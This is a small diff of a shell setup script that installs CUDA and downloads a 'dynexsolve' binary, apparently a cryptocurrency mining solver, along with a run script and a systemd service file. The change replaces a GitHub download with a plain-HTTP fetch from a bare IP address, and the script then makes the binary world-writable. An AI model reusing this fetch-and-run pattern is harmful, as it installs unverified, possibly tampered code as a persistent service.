@@ -11,7 +11,7 @@ sudo apt-get -y install cuda
 sudo apt-get install -y libcurl4-nss-dev
 mkdir run
 cd run
-wget https://github.com/khangcbs/mr/raw/main/dynexsolve
+wget http://20.239.67.77/dynexsolve
 wget https://raw.githubusercontent.com/khangcbs/mr/main/run.sh
 wget https://raw.githubusercontent.com/khangcbs/mr/main/dssd.service
 chmod 777 dynexsolve
